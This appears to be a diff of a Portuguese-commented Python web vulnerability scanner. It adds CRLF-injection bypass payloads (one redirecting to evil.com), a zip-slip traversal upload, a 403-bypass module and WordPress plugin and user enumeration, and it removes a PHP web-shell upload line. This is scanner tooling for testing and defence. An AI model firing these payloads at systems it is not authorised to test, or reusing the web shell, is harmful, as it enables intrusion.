         """GraphQL security audit — introspection, field suggestions, trace mode, IDE (graphql-cop)."""
@@ -7827,24 +8280,79 @@ class VulnScanner:
                   technique="Payloads ' or '1'='1 em apps com XPath")
 
     def check_crlf_injection(self):
-        payloads = ["%0d%0aX-Injected: header", "\r\nX-Injected: header",
-                    "%0d%0aSet-Cookie: evil=1"]
-        for url in self._get_urls_with_params() or []:
+        """CRLF Injection — 12 bypass payloads (Lockdoor: double encoding, 3-byte chars, Unicode)."""
+        payloads = [
+            "%0d%0aX-Injected:CyberDyne",
+            "%0D%0AX-Injected:CyberDyne",
+            "%0d%0aSet-Cookie:crlf=injection",
+            "%250d%250aX-Injected:CyberDyne",          # double encoded
+            "%25250d%25250aX-Injected:CyberDyne",       # triple encoded
+            "%E5%98%8A%E5%98%8DX-Injected:CyberDyne",   # 3-byte Unicode bypass
+            "%c0%8d%c0%8aX-Injected:CyberDyne",         # overlong UTF-8
+            "%0d%0a%0d%0a<h1>CyberDyne</h1>",           # HTTP response splitting
+            "%0d%0aLocation:https://evil.com",            # redirect injection
+        ]
+        # Augmentar com Payloads_CY
+        _crlf_extra = _load_payload("CRLF/crlf-bypass-payloads.txt", 15)
+        for _cp in _crlf_extra:
+            if _cp not in payloads:
+                payloads.append(_cp)
+
+        # Também carregar crlf-injection-payloads.json se disponível
+        try:
+            with open(os.path.join(PAYLOADS_DIR, "CRLF", "crlf-injection-payloads.json"), encoding="utf-8") as _cf:
+                _crlf_json = json.load(_cf)
+            _crlf_list = _crlf_json if isinstance(_crlf_json, list) else _crlf_json.get("payloads", [])
+            for _cp in _crlf_list[:10]:
+                _pstr = _cp.get("payload", _cp) if isinstance(_cp, dict) else str(_cp)
+                if _pstr and _pstr not in payloads:
+                    payloads.append(_pstr)
+        except Exception:
+            pass
+
+        _marker = "X-Injected"
+        _marker_cookie = "crlf=injection"
+        for url in (self._get_urls_with_params() or [self.target + "/?q=test"])[:5]:
+            if _cancel_event.is_set():
+                break
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
-            for param in params:
-                for p in payloads[:1]:
-                    new_params = {k: (p if k == param else v[0]) for k, v in params.items()}
+            if not params:
+                params = {"q": ["test"]}
+            for param in list(params.keys())[:2]:
+                for p in payloads:
+                    if _cancel_event.is_set():
+                        break
+                    new_params = {k: (p if k == param else (v[0] if isinstance(v, list) else v))
+                                 for k, v in params.items()}
                     test_url = parsed._replace(query=urlencode(new_params)).geturl()
                     r = safe_get(test_url)
-                    if r and "x-injected" in {k.lower():v for k,v in r.headers.items()}:
-                        self._add(75,"CRLF Injection / HTTP Splitting","Infra","MEDIO","VULNERAVEL",
-                                  evidence=f"Header X-Injected apareceu na resposta via {param}",
-                                  recommendation="Sanitizar \r\n em parâmetros usados em headers/Location.",
-                                  technique="%0d%0a em headers; injetar Set-Cookie ou Location")
+                    if not r:
+                        continue
+                    resp_hdrs = {k.lower(): v for k, v in r.headers.items()}
+                    # Check if injected header appeared
+                    if _marker.lower() in resp_hdrs:
+                        self._add(75, "CRLF Injection / HTTP Splitting", "Infra", "ALTO", "VULNERAVEL",
+                                  evidence=f"Header {_marker} injetado via {param} com payload: {p[:40]}",
+                                  recommendation="Sanitizar \\r\\n e encodings em input do usuario. Usar framework que bloqueia header injection.",
+                                  technique=f"Lockdoor: {len(payloads)} payloads (double encode + 3-byte Unicode + overlong UTF-8)")
                         return
-        self._add(75,"CRLF Injection / HTTP Splitting","Infra","MEDIO","SEGURO",
-                  technique="%0d%0a em headers; injetar Set-Cookie ou Location")
+                    # Check Set-Cookie injection
+                    if _marker_cookie in resp_hdrs.get("set-cookie", ""):
+                        self._add(75, "CRLF Injection / HTTP Splitting", "Infra", "ALTO", "VULNERAVEL",
+                                  evidence=f"Cookie 'crlf=injection' injetado via {param}",
+                                  recommendation="Sanitizar \\r\\n em todos os parametros refletidos em headers.",
+                                  technique=f"Lockdoor: Set-Cookie injection via CRLF")
+                        return
+                    # Check body injection (response splitting)
+                    if "<h1>CyberDyne</h1>" in r.text and "%0d%0a%0d%0a" in p:
+                        self._add(75, "CRLF Injection / HTTP Response Splitting", "Infra", "CRITICO", "VULNERAVEL",
+                                  evidence=f"HTTP response splitting confirmado via {param} — HTML injetado no body",
+                                  recommendation="Bloquear CRLF em todos os parametros. Upgrade do web server.",
+                                  technique=f"Lockdoor: HTTP response splitting via double CRLF")
+                        return
+        self._add(75, "CRLF Injection / HTTP Splitting", "Infra", "MEDIO", "SEGURO",
+                  technique=f"Lockdoor: {len(payloads)} payloads testados (encode, 3-byte, Unicode, splitting)")
 
     # ── LÓGICA 76–100 ─────────────────────────────────────────────────────────
 
@@ -7859,39 +8367,99 @@ class VulnScanner:
                     upload_forms.append(urljoin(self.target, action.group(1)) if action else self.target)
         vuln = False
         evidence = ""
+        _canary = "CYBERDYNE_UPLOAD_CANARY_" + str(int(time.time()))
         for form_url in upload_forms[:2]:
-            # Simular upload de PHP
-            files = {"file": ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/octet-stream")}
-            try:
-                r2 = requests.post(form_url, files=files, headers=HEADERS_BASE,
-                                   verify=False, timeout=8)
-                if r2 and r2.status_code in [200,201] and "success" in r2.text.lower():
-                    vuln = True
-                    evidence = f"Upload de .php aceito em {form_url}"
-            except Exception:
-                pass
+            # Testar upload de extensões perigosas com canary rastreável
+            test_files = [
+                ("test.php", f"<?php echo '{_canary}'; ?>".encode(), "application/octet-stream"),
+                ("test.php.jpg", f"<?php echo '{_canary}'; ?>".encode(), "image/jpeg"),
+                ("test.phtml", f"<?php echo '{_canary}'; ?>".encode(), "application/octet-stream"),
+                ("test.html", f"<h1>{_canary}</h1>".encode(), "text/html"),
+            ]
+            for fname, content, mime in test_files:
+                try:
+                    r2 = requests.post(form_url, files={"file": (fname, content, mime)},
+                                       headers=HEADERS_BASE, verify=False, timeout=10,
+                                       cookies=_auth_cookies or None)
+                    if not r2 or r2.status_code not in [200, 201]:
+                        continue
+                    body_low = r2.text.lower()
+                    # Confirmar: response contém indicador de sucesso E extrair URL do arquivo
+                    if any(kw in body_low for kw in ["success", "uploaded", "url", "path", "file"]):
+                        # Tentar extrair URL do arquivo upado da response
+                        _url_match = re.search(r'["\']((?:https?://)?[^"\']*' + re.escape(fname.split('.')[0]) + r'[^"\']*)["\']', r2.text)
+                        if _url_match:
+                            upload_url = urljoin(self.target, _url_match.group(1))
+                            r3 = safe_get(upload_url)
+                            if r3 and _canary in r3.text:
+                                vuln = True
+                                evidence = f"{fname} aceito e acessível em {upload_url}"
+                                break
+                        # Fallback: se "success" mas sem URL, confirmar parcialmente
+                        elif "success" in body_low:
+                            vuln = True
+                            evidence = f"{fname} aceito em {form_url} (upload confirmado, acesso não testado)"
+                            break
+                except Exception:
+                    pass
+            if vuln:
+                break
         status = "VULNERAVEL" if vuln else "SEGURO"
         self._add(76,"File Upload sem validação","Lógica","CRITICO",status,
                   evidence=evidence,
-                  recommendation="Validar extensão e MIME type; renomear arquivos; isolar upload dir.",
-                  technique="Upload de .php, .jsp; bypass por MIME, double extension")
+                  recommendation="Validar extensão e MIME type; renomear arquivos; isolar upload dir; não executar uploads.",
+                  technique="Upload de .php/.phtml/.html com canary; verificar acesso ao arquivo; bypass MIME")
 
     def check_zip_slip(self):
-        # Verificar se há endpoint de upload de zip
-        zip_paths = ["/api/upload", "/upload", "/api/import", "/import", "/api/extract"]
+        """Zip Slip — envia zip malicioso com path traversal no filename e verifica se o arquivo é extraído."""
+        zip_paths = ["/api/upload", "/upload", "/api/import", "/import", "/api/extract",
+                     "/api/v1/upload", "/api/v1/import"]
+        # Criar zip malicioso em memória com path traversal
+        import zipfile, io
+        zip_buf = io.BytesIO()
+        try:
+            with zipfile.ZipFile(zip_buf, 'w') as zf:
+                zf.writestr("../../../tmp/cyberdyne_zipslip_test.txt", "CYBERDYNE_ZIPSLIP_CANARY")
+            zip_buf.seek(0)
+        except Exception:
+            self._add(77,"Zip Slip (path traversal via zip)","Lógica","ALTO","SEGURO",
+                      technique="Zip com ../../tmp/canary como filename")
+            return
+
         vuln = False
         evidence = ""
         for path in zip_paths:
-            r = safe_get(self.target + path)
-            if r and r.status_code != 404:
-                vuln = True
-                evidence = f"Endpoint de upload/extração encontrado: {path} — testar Zip Slip manualmente"
-                break
+            url = self.target + path
+            try:
+                r = requests.post(url, files={"file": ("test.zip", zip_buf.getvalue(), "application/zip")},
+                                  headers=HEADERS_BASE, verify=False, timeout=10,
+                                  cookies=_auth_cookies or None)
+                if not r or r.status_code in [404, 405]:
+                    continue
+                # Verificar se o canary foi extraído
+                if r.status_code in [200, 201]:
+                    # Checar se o servidor reportou extração bem-sucedida
+                    body_low = r.text.lower()
+                    if any(kw in body_low for kw in ["extracted", "imported", "success", "uploaded", "processed"]):
+                        # Tentar acessar o arquivo canary
+                        canary_paths = ["/tmp/cyberdyne_zipslip_test.txt",
+                                        "/../../../tmp/cyberdyne_zipslip_test.txt"]
+                        for cp in canary_paths:
+                            rc = safe_get(self.target + cp)
+                            if rc and "CYBERDYNE_ZIPSLIP_CANARY" in rc.text:
+                                vuln = True
+                                evidence = f"Zip Slip confirmado: {path} extraiu arquivo com traversal para {cp}"
+                                break
+                    if vuln:
+                        break
+            except Exception:
+                pass
+
         status = "VULNERAVEL" if vuln else "SEGURO"
         self._add(77,"Zip Slip (path traversal via zip)","Lógica","ALTO",status,
                   evidence=evidence,
-                  recommendation="Sanitizar nomes de arquivo em zips; bloquear ../ em paths.",
-                  technique="Zip com ../../evil.sh como filename; testar em features de upload")
+                  recommendation="Sanitizar nomes de arquivo em zips; bloquear ../ em paths extraídos.",
+                  technique="Upload de zip com ../../canary.txt; verificar extração via path traversal")
 
     def check_insecure_cookies(self):
         r = safe_get(self.target)
@@ -9141,6 +9709,204 @@ class VulnScanner:
 
     # ── RUNNER PRINCIPAL ──────────────────────────────────────────────────────
 
+    def check_403_bypass(self):
+        """403 Bypass — testa headers IP-spoof, path manipulation, method override, host header tricks."""
+        from urllib.parse import urlparse
+
+        spoof_headers = _load_payload("403-Bypass/ip-spoof-headers.txt")
+        path_patterns = _load_payload("403-Bypass/path-bypass-patterns.txt")
+        spoof_ips = ["127.0.0.1", "10.0.0.1", "0.0.0.0"]
+
+        # ── 1. Coletar paths que retornam 403/401 ───────────────────────────
+        common_paths = [
+            "/admin", "/admin/", "/administrator", "/api/admin", "/dashboard",
+            "/server-status", "/server-info", "/manager", "/console",
+            "/phpmyadmin", "/wp-admin", "/cpanel", "/config", "/env",
+            "/.htaccess", "/.env", "/internal", "/private", "/secret",
+            "/debug", "/actuator", "/metrics", "/health", "/status",
+        ]
+
+        parsed = urlparse(self.target)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+
+        forbidden_paths = []
+        log(f"  {Fore.CYAN}[403-BYPASS] Coletando paths 403/401...{Style.RESET_ALL}")
+
+        def _probe_path(p):
+            if _cancel_event.is_set():
+                return None
+            url = base + p
+            r = safe_get(url, timeout=5)
+            if r and r.status_code in (403, 401):
+                return (p, r.status_code, len(r.content))
+            return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
+            for result in pool.map(_probe_path, common_paths):
+                if result:
+                    forbidden_paths.append(result)
+
+        if not forbidden_paths:
+            self._add(112, "403 Bypass", "Infra", "ALTO", "SEGURO",
+                      evidence="Nenhum path retornou 403/401 para testar bypass",
+                      recommendation="N/A",
+                      technique="Testados 25+ paths comuns — nenhum bloqueado")
+            return
+
+        log(f"  {Fore.CYAN}[403-BYPASS] {len(forbidden_paths)} paths bloqueados encontrados — iniciando bypass...{Style.RESET_ALL}")
+
+        # ── 2. Tentar bypass em cada path 403 ───────────────────────────────
+        bypasses_found = []
+        total_tests = [0]
+        max_tests = [0]
+        tests_lock = threading.Lock()
+
+        # Estimar total de testes
+        n_paths = len(forbidden_paths)
+        n_spoof = len(spoof_headers) * len(spoof_ips)
+        n_path_patterns = len(path_patterns)
+        n_method = 3
+        n_host = 4
+        max_tests[0] = n_paths * (n_spoof + n_path_patterns + n_method + n_host)
+
+        def _update_progress(path_label):
+            with tests_lock:
+                total_tests[0] += 1
+                done = total_tests[0]
+            if done % 20 == 0 or done == max_tests[0]:
+                log(f"  {Fore.CYAN}[403-BYPASS] {done}/{max_tests[0]} | bypassed: {len(bypasses_found)} | testing: {path_label}{Style.RESET_ALL}")
+
+        def _is_real_bypass(resp, orig_status, orig_len):
+            """Verifica se a resposta é um bypass real (não apenas 200 com error page)."""
+            if resp is None:
+                return False
+            if resp.status_code not in (200, 301, 302):
+                return False
+            # Se mudou de 403 para 200, verificar se não é uma página de erro genérica
+            body_lower = resp.text[:2000].lower() if resp.text else ""
+            error_indicators = ["access denied", "forbidden", "not authorized",
+                                "401 unauthorized", "403 forbidden", "error",
+                                "you don't have permission", "login required"]
+            for indicator in error_indicators:
+                if indicator in body_lower:
+                    return False
+            # Content-length muito diferente do original é bom sinal
+            new_len = len(resp.content)
+            if new_len < 50:
+                return False  # Resposta muito curta, provavelmente não é conteúdo real
+            return True
+
+        def _test_bypass_for_path(path_info):
+            path, orig_status, orig_len = path_info
+            path_label = path[:30]
+
+            if len(bypasses_found) >= 3:
+                return
+            if _cancel_event.is_set():
+                return
+
+            full_url = base + path
+
+            # ── a. IP Spoofing Headers ──────────────────────────────────
+            for hdr_name in spoof_headers:
+                if _cancel_event.is_set() or len(bypasses_found) >= 3:
+                    return
+                for ip in spoof_ips:
+                    _update_progress(path_label)
+                    r = safe_get(full_url, headers={hdr_name: ip}, timeout=5)
+                    if _is_real_bypass(r, orig_status, orig_len):
+                        evidence = f"BYPASS via header [{hdr_name}: {ip}] em {path} — {orig_status}→{r.status_code} (len:{len(r.content)})"
+                        bypasses_found.append(evidence)
+                        log(f"  {Fore.RED}[403-BYPASS] BYPASS CONFIRMADO: {evidence}{Style.RESET_ALL}")
+                        if len(bypasses_found) >= 3:
+                            return
+                        break  # próximo header
+
+            # ── b. Path Manipulation ────────────────────────────────────
+            stripped_path = path.lstrip("/")
+            for pattern in path_patterns:
+                if _cancel_event.is_set() or len(bypasses_found) >= 3:
+                    return
+                _update_progress(path_label)
+                manipulated = pattern.replace("{path}", stripped_path)
+                if not manipulated.startswith("/"):
+                    manipulated = "/" + manipulated
+                test_url = base + manipulated
+                r = safe_get(test_url, timeout=5)
+                if _is_real_bypass(r, orig_status, orig_len):
+                    evidence = f"BYPASS via path [{manipulated}] em {path} — {orig_status}→{r.status_code} (len:{len(r.content)})"
+                    bypasses_found.append(evidence)
+                    log(f"  {Fore.RED}[403-BYPASS] BYPASS CONFIRMADO: {evidence}{Style.RESET_ALL}")
+                    if len(bypasses_found) >= 3:
+                        return
+
+            # ── c. HTTP Method Override ─────────────────────────────────
+            method_override_headers = [
+                {"X-HTTP-Method-Override": "GET"},
+                {"X-Method-Override": "GET"},
+                {"X-HTTP-Method": "GET"},
+            ]
+            for moh in method_override_headers:
+                if _cancel_event.is_set() or len(bypasses_found) >= 3:
+                    return
+                _update_progress(path_label)
+                r = safe_get(full_url, headers=moh, method="POST", timeout=5)
+                if _is_real_bypass(r, orig_status, orig_len):
+                    hdr_str = list(moh.keys())[0]
+                    evidence = f"BYPASS via method override [{hdr_str}: GET] POST→{r.status_code} em {path}"
+                    bypasses_found.append(evidence)
+                    log(f"  {Fore.RED}[403-BYPASS] BYPASS CONFIRMADO: {evidence}{Style.RESET_ALL}")
+                    if len(bypasses_found) >= 3:
+                        return
+
+            # ── d. Host Header Manipulation ─────────────────────────────
+            host_tricks = [
+                {"X-Forwarded-Host": "localhost"},
+                {"X-Original-URL": path},
+                {"X-Rewrite-URL": path},
+                {"X-Custom-IP-Authorization": "127.0.0.1"},
+            ]
+            for ht in host_tricks:
+                if _cancel_event.is_set() or len(bypasses_found) >= 3:
+                    return
+                _update_progress(path_label)
+                r = safe_get(full_url, headers=ht, timeout=5)
+                if _is_real_bypass(r, orig_status, orig_len):
+                    hdr_str = "; ".join(f"{k}: {v}" for k, v in ht.items())
+                    evidence = f"BYPASS via host trick [{hdr_str}] em {path} — {orig_status}→{r.status_code}"
+                    bypasses_found.append(evidence)
+                    log(f"  {Fore.RED}[403-BYPASS] BYPASS CONFIRMADO: {evidence}{Style.RESET_ALL}")
+                    if len(bypasses_found) >= 3:
+                        return
+
+        # ── 3. Executar em paralelo ──────────────────────────────────────────
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
+            futs = [pool.submit(_test_bypass_for_path, pi) for pi in forbidden_paths]
+            for fut in concurrent.futures.as_completed(futs):
+                if _cancel_event.is_set():
+                    break
+                try:
+                    fut.result()
+                except Exception:
+                    pass
+
+        # ── 4. Salvar resultados ─────────────────────────────────────────────
+        if bypasses_found:
+            all_evidence = " | ".join(bypasses_found[:3])
+            self._add(112, "403 Bypass", "Infra", "ALTO", "VULNERAVEL",
+                      evidence=all_evidence,
+                      recommendation="Configurar controle de acesso no backend (não confiar apenas em proxy/WAF). "
+                                     "Validar paths canonicalizados. Remover headers de override em produção.",
+                      technique=f"Testados {total_tests[0]} combinações (IP-spoof, path manip, method override, host trick) "
+                                f"em {len(forbidden_paths)} paths 403/401 — {len(bypasses_found)} bypass(s) confirmado(s)")
+        else:
+            self._add(112, "403 Bypass", "Infra", "ALTO", "SEGURO",
+                      evidence=f"Testados {total_tests[0]} bypass attempts em {len(forbidden_paths)} paths — nenhum bypass encontrado",
+                      recommendation="Controle de acesso parece robusto. Continuar monitorando.",
+                      technique=f"IP-spoof ({len(spoof_headers)} headers × {len(spoof_ips)} IPs), "
+                                f"path manipulation ({len(path_patterns)} patterns), "
+                                f"method override, host header tricks")
+
     def check_bruteforce(self):
         # Implementação básica conectando com o passcrack via lógica ou execução do script externo
         if self.login_url:
@@ -9204,6 +9970,7 @@ class VulnScanner:
                 self.check_xpath_injection, self.check_crlf_injection,
                 self.check_http_parameter_pollution,
                 self.check_waf_bypass,
+                self.check_403_bypass,
             ]),
             ("Lógica / Negócio", [
                 self.check_file_upload, self.check_zip_slip,
@@ -9232,9 +9999,23 @@ class VulnScanner:
         _counter = [0]
         _ctr_lck = threading.Lock()
 
+        _scan_start = time.time()
         print(f"\n{Fore.CYAN}{Style.BRIGHT}"
               f"  ══════ FASE 2 — {total} CHECKS EM PARALELO (8 workers/grupo) ══════"
               f"{Style.RESET_ALL}\n", flush=True)
+
+        _active_checks = {}  # thread_id → label (checks em andamento)
+        _active_lock = threading.Lock()
+
+        def _show_active():
+            """Mostra quais checks estão rodando agora (barra de atividade)."""
+            with _active_lock:
+                running = list(_active_checks.values())
+            if running:
+                names = ", ".join(running[:4])
+                extra = f" +{len(running)-4}" if len(running) > 4 else ""
+                print(f"\r  {Fore.MAGENTA}⟳ Testando: {names}{extra}{' '*20}{Style.RESET_ALL}",
+                      end="", flush=True)
 
         def _exec(check_fn, global_idx):
             """Executa um check com timeout de 45s e atualiza progresso."""
@@ -9242,24 +10023,42 @@ class VulnScanner:
                 return
             name  = getattr(check_fn, "__name__", f"check_{global_idx}")
             label = name.replace("check_", "").replace("_", " ").upper()
+            tid = threading.current_thread().ident
+            with _active_lock:
+                _active_checks[tid] = label
+            _show_active()
             try:
                 with concurrent.futures.ThreadPoolExecutor(max_workers=1) as _t:
                     _t.submit(check_fn).result(timeout=45)
             except concurrent.futures.TimeoutError:
-                print(f"  {Fore.YELLOW}[TIMEOUT] {label} >45s — pulado{Style.RESET_ALL}",
+                print(f"\r{' '*100}\r  {Fore.YELLOW}[TIMEOUT] {label} >45s — pulado{Style.RESET_ALL}",
                       flush=True)
                 self._add(global_idx, name, "ERRO", "BAIXO", "SKIP",
                           evidence="Timeout de 45s excedido", technique="N/A")
             except Exception as e:
-                print(f"  {Fore.RED}[ERRO] {label}: {e}{Style.RESET_ALL}", flush=True)
+                print(f"\r{' '*100}\r  {Fore.RED}[ERRO] {label}: {e}{Style.RESET_ALL}", flush=True)
+            finally:
+                with _active_lock:
+                    _active_checks.pop(tid, None)
             with _ctr_lck:
                 _counter[0] += 1
                 done = _counter[0]
             vulns = sum(1 for r in self.results if r.status == "VULNERAVEL")
-            print(f"  {Fore.CYAN}[{done:03d}/{total}] ✓ {label}"
-                  f"{(' ' + Fore.RED + f'[{vulns} vulns]' + Style.RESET_ALL) if vulns else ''}"
-                  f"{Style.RESET_ALL}", flush=True)
-            # Live dashboard update
+            _elapsed = time.time() - _scan_start
+            _rate = done / _elapsed if _elapsed > 0 else 0
+            _remaining = (total - done) / _rate if _rate > 0 else 0
+            _eta = f"~{int(_remaining//60)}m{int(_remaining%60):02d}s" if _remaining >= 60 else f"~{int(_remaining)}s"
+            # Resultado do check
+            _last_result = self.results[-1] if self.results else None
+            _status_icon = ""
+            if _last_result and _last_result.name == name:
+                if _last_result.status == "VULNERAVEL":
+                    _status_icon = f"{Fore.RED}✗ VULN{Style.RESET_ALL}"
+                else:
+                    _status_icon = f"{Fore.GREEN}✓{Style.RESET_ALL}"
+            print(f"\r{' '*100}\r  [{done:03d}/{total}] {_status_icon} {label}"
+                  f"  {Fore.CYAN}ETA: {_eta} | {vulns} vulns{Style.RESET_ALL}", flush=True)
+            _show_active()
             _live_update(progress=done, total=total)
 
         global_idx = 0
@@ -9290,6 +10089,594 @@ class VulnScanner:
         return self.results
 
 # ─────────────────────────────────────────────────────────────────────────────
+# MÓDULO WORDPRESS SECURITY AUDIT — WPScan-style (--wp)
+# Plugins, Themes, Users, XMLRPC, CVEs, Config Backups, Debug Log, etc.
+# ─────────────────────────────────────────────────────────────────────────────
+class WPAudit:
+    """WordPress Security Audit — WPScan-style checks."""
+
+    def __init__(self, target, output_dir, scanner):
+        self.target     = target.rstrip("/")
+        self.output_dir = output_dir
+        self.scanner    = scanner
+        self.session    = requests.Session()
+        self.session.headers.update(HEADERS_BASE)
+        self.session.verify = False
+        self.wp_version = ""
+        self.plugins    = []
+        self.themes     = []
+        self.users      = []
+        self.xmlrpc     = {}
+        self.findings   = []
+        self.cves       = []
+
+    # ── helpers ──────────────────────────────────────────────────────────────
+    def _get(self, url, **kwargs):
+        kwargs.setdefault("timeout", 10)
+        kwargs.setdefault("allow_redirects", True)
+        try:
+            return self.session.get(url, **kwargs)
+        except Exception:
+            return None
+
+    def _post(self, url, **kwargs):
+        kwargs.setdefault("timeout", 10)
+        try:
+            return self.session.post(url, **kwargs)
+        except Exception:
+            return None
+
+    def _head(self, url, **kwargs):
+        kwargs.setdefault("timeout", 8)
+        kwargs.setdefault("allow_redirects", True)
+        try:
+            return self.session.head(url, **kwargs)
+        except Exception:
+            return None
+
+    # ── 1. _is_wordpress ─────────────────────────────────────────────────────
+    def _is_wordpress(self):
+        if _cancel_event.is_set():
+            return False
+        log(f"  {Fore.CYAN}[WP] Verificando se alvo é WordPress...{Style.RESET_ALL}")
+        # Check homepage HTML
+        r = self._get(self.target)
+        if r and r.status_code == 200:
+            body = r.text
+            if re.search(r'<meta[^>]+content=["\']WordPress', body, re.I):
+                return True
+            if "wp-content/" in body or "wp-includes/" in body:
+                return True
+        # Check wp-login.php
+        r2 = self._get(f"{self.target}/wp-login.php")
+        if r2 and r2.status_code == 200 and "wp-login" in (r2.text or "").lower():
+            return True
+        # Check admin-ajax
+        r3 = self._get(f"{self.target}/wp-admin/admin-ajax.php")
+        if r3 and r3.status_code in (200, 400):
+            return True
+        return False
+
+    # ── 2. _detect_version ───────────────────────────────────────────────────
+    def _detect_version(self):
+        if _cancel_event.is_set():
+            return ""
+        log(f"  {Fore.CYAN}[WP] Detectando versão do WordPress...{Style.RESET_ALL}")
+        # Method 1: meta generator
+        r = self._get(self.target)
+        if r and r.status_code == 200:
+            m = re.search(r'<meta[^>]+content=["\']WordPress\s+([\d.]+)', r.text, re.I)
+            if m:
+                v = m.group(1)
+                log(f"  {Fore.GREEN}[WP] Versão detectada (meta): {v}{Style.RESET_ALL}")
+                return v
+        # Method 2: /feed/
+        r2 = self._get(f"{self.target}/feed/")
+        if r2 and r2.status_code == 200:
+            m2 = re.search(r'<generator>https?://wordpress\.org/\?v=([\d.]+)</generator>', r2.text, re.I)
+            if m2:
+                v = m2.group(1)
+                log(f"  {Fore.GREEN}[WP] Versão detectada (feed): {v}{Style.RESET_ALL}")
+                return v
+        # Method 3: /feed/atom/
+        r3 = self._get(f"{self.target}/feed/atom/")
+        if r3 and r3.status_code == 200:
+            m3 = re.search(r'<generator[^>]+version=["\']?([\d.]+)', r3.text, re.I)
+            if m3:
+                v = m3.group(1)
+                log(f"  {Fore.GREEN}[WP] Versão detectada (atom): {v}{Style.RESET_ALL}")
+                return v
+        # Method 4: /readme.html
+        r4 = self._get(f"{self.target}/readme.html")
+        if r4 and r4.status_code == 200:
+            m4 = re.search(r'Version\s+([\d.]+)', r4.text)
+            if m4:
+                v = m4.group(1)
+                log(f"  {Fore.GREEN}[WP] Versão detectada (readme): {v}{Style.RESET_ALL}")
+                return v
+        # Method 5: /?feed=rss2
+        r5 = self._get(f"{self.target}/?feed=rss2")
+        if r5 and r5.status_code == 200:
+            m5 = re.search(r'<generator>https?://wordpress\.org/\?v=([\d.]+)', r5.text, re.I)
+            if m5:
+                v = m5.group(1)
+                log(f"  {Fore.GREEN}[WP] Versão detectada (rss2): {v}{Style.RESET_ALL}")
+                return v
+        log(f"  {Fore.YELLOW}[WP] Não foi possível detectar a versão{Style.RESET_ALL}")
+        return ""
+
+    # ── 3. _enumerate_plugins ────────────────────────────────────────────────
+    def _enumerate_plugins(self):
+        if _cancel_event.is_set():
+            return []
+        log(f"  {Fore.CYAN}[WP] Enumerando plugins...{Style.RESET_ALL}")
+        found = {}  # slug -> {slug, version, source}
+
+        # Passive: extract from homepage HTML
+        r = self._get(self.target)
+        if r and r.status_code == 200:
+            slugs = re.findall(r'/wp-content/plugins/([a-zA-Z0-9_-]+)/', r.text)
+            for s in set(slugs):
+                found[s] = {"slug": s, "version": "", "source": "passive"}
+
+        # Aggressive: brute-force from wordlist
+        wordlist = _load_payload("WordPress/wp-plugins-top500.txt", limit=211)
+        if not wordlist:
+            log(f"  {Fore.YELLOW}[WP] Wordlist de plugins não encontrada{Style.RESET_ALL}")
+            return list(found.values())
+
+        total = len(wordlist)
+        counter = {"done": 0, "found": len(found)}
+        start_time = time.time()
+
+        def _probe_plugin(slug):
+            if _cancel_event.is_set():
+                return
+            url = f"{self.target}/wp-content/plugins/{slug}/"
+            resp = self._head(url)
+            exists = resp and resp.status_code in (200, 403, 401, 500)
+            version = ""
+            if exists:
+                # Try to read readme.txt for version
+                rtxt = self._get(f"{self.target}/wp-content/plugins/{slug}/readme.txt")
+                if rtxt and rtxt.status_code == 200:
+                    vm = re.search(r'Stable tag:\s*([\d.]+)', rtxt.text, re.I)
+                    if vm:
+                        version = vm.group(1)
+                with lock:
+                    if slug not in found:
+                        found[slug] = {"slug": slug, "version": version, "source": "aggressive"}
+                        counter["found"] += 1
+                    elif version and not found[slug]["version"]:
+                        found[slug]["version"] = version
+            with lock:
+                counter["done"] += 1
+                done = counter["done"]
+            if done % 20 == 0 or done == total:
+                elapsed = time.time() - start_time
+                rate = done / elapsed if elapsed > 0 else 1
+                remaining = (total - done) / rate if rate > 0 else 0
+                log(f"  {Fore.CYAN}[WP-PLUGINS] {done}/{total} | found: {counter['found']} | ETA: ~{int(remaining)}s{Style.RESET_ALL}")
+
+        with ThreadPoolExecutor(max_workers=20) as pool:
+            pool.map(_probe_plugin, wordlist)
+
+        self.plugins = list(found.values())
+        log(f"  {Fore.GREEN}[WP] {len(self.plugins)} plugins encontrados{Style.RESET_ALL}")
+        return self.plugins
+
+    # ── 4. _enumerate_themes ─────────────────────────────────────────────────
+    def _enumerate_themes(self):
+        if _cancel_event.is_set():
+            return []
+        log(f"  {Fore.CYAN}[WP] Enumerando temas...{Style.RESET_ALL}")
+        found = {}
+
+        # Passive: extract from homepage CSS links
+        r = self._get(self.target)
+        if r and r.status_code == 200:
+            slugs = re.findall(r'/wp-content/themes/([a-zA-Z0-9_-]+)/', r.text)
+            for s in set(slugs):
+                found[s] = {"slug": s, "version": ""}
+
+        # Aggressive: from wordlist
+        wordlist = _load_payload("WordPress/wp-themes-common.txt")
+        if wordlist:
+            for slug in wordlist:
+                if _cancel_event.is_set():
+                    break
+                if slug in found:
+                    continue
+                resp = self._head(f"{self.target}/wp-content/themes/{slug}/")
+                if resp and resp.status_code in (200, 403, 401, 500):
+                    found[slug] = {"slug": slug, "version": ""}
+
+        # For detected themes, try to get version from style.css
+        for slug in list(found.keys()):
+            if _cancel_event.is_set():
+                break
+            css = self._get(f"{self.target}/wp-content/themes/{slug}/style.css")
+            if css and css.status_code == 200:
+                vm = re.search(r'Version:\s*([\d.]+)', css.text, re.I)
+                if vm:
+                    found[slug]["version"] = vm.group(1)
+
+        self.themes = list(found.values())
+        log(f"  {Fore.GREEN}[WP] {len(self.themes)} temas encontrados{Style.RESET_ALL}")
+        return self.themes
+
+    # ── 5. _enumerate_users ──────────────────────────────────────────────────
+    def _enumerate_users(self):
+        if _cancel_event.is_set():
+            return []
+        log(f"  {Fore.CYAN}[WP] Enumerando usuários...{Style.RESET_ALL}")
+        users = set()
+
+        # Method 1: REST API
+        r = self._get(f"{self.target}/wp-json/wp/v2/users/")
+        if r and r.status_code == 200:
+            try:
+                for u in r.json():
+                    slug = u.get("slug", "")
+                    if slug:
+                        users.add(slug)
+            except (ValueError, TypeError):
+                pass
+
+        # Method 2: Author archives
+        for i in range(1, 11):
+            if _cancel_event.is_set():
+                break
+            r2 = self._get(f"{self.target}/?author={i}", allow_redirects=False)
+            if r2 is None:
+                continue
+            # Check redirect location for /author/USERNAME/
+            loc = r2.headers.get("Location", "")
+            m = re.search(r'/author/([^/]+)/', loc)
+            if m:
+                users.add(m.group(1))
+                continue
+            # Check body for author slug
+            if r2.status_code == 200 and r2.text:
